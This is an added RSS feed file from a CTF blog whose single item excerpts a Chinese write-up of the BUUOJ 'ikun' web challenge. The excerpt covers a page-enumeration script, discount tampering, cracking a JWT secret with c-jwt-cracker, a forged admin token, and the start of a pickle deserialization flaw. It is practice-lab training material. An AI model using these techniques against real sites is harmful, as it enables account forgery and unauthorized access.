@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JWT on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/jwt/</link>
+    <description>Recent content in JWT on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 14 Apr 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/jwt/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BUUOJ刷题记录(2)</title>
+      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</link>
+      <pubDate>Tue, 14 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</guid>
+      <description>[CISCN2019 华北赛区 Day1 Web2]ikun 考点：简单python脚本、逻辑漏洞、JWT破解与伪造、python反序列化
+页面源码里面提示脑洞比较大，给了提示，如上图
+目的是要买到LV6的东西，下面则是500页的商品，需要我们自行寻找。
+在源码里面看到，每个商品的图片就是lv?.png那么我们推测lv6.png一定存在于某一页。
+写一个脚本找找：
+#by wh1sperimport requestshost = &#39;http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=&#39;for i in range(1,500):r = requests.get(url=host+str(i))if &#39;lv6.png&#39; in r.text:print(&#39;page = &#39;, i)break得到181，访问之：
+http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181不出预料的买不起。。。
+但是我们回头去看burp里面的数据包，发现请求体里面有一个键名为discount=0.8，改成discount=0.00000000001试试，果然可以，成功购买了lv6，页面重定向到 /b1g_m4mber 不过提示这个页面只能admin才能访问。于是我们又回过头去看请求头，发现cookie里面有一个东西叫做JWT（Json Web Token）
+JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58附上爆破工具GitHub地址：https://github.com/brendan-rius/c-jwt-cracker
+root@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58Secret is &amp;quot;1Kun&amp;quot;root@kali:~/tools/JWTcrake/c-jwt-cracker-master#在https://jwt.io/这个网站可以进行伪造，把身份改成admin。
+我们就可以愉快的进行伪造了，打开F12-&amp;gt;application-&amp;gt;cookie,将JWT值改成：
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo刷新之后我们就是admin啦~
+ctrl+U查看源码，提示了/static/asd1f654e683wq/www.zip网站源码，
+下载下来，发现是python的tornado框架编写的后端
+在/sshop/views/Admin.py里面发现了python反序列化漏洞：
+#by wh1sper#Admin.pyimport tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):@tornado.</description>
+    </item>
+    
+  </channel>
+</rss>
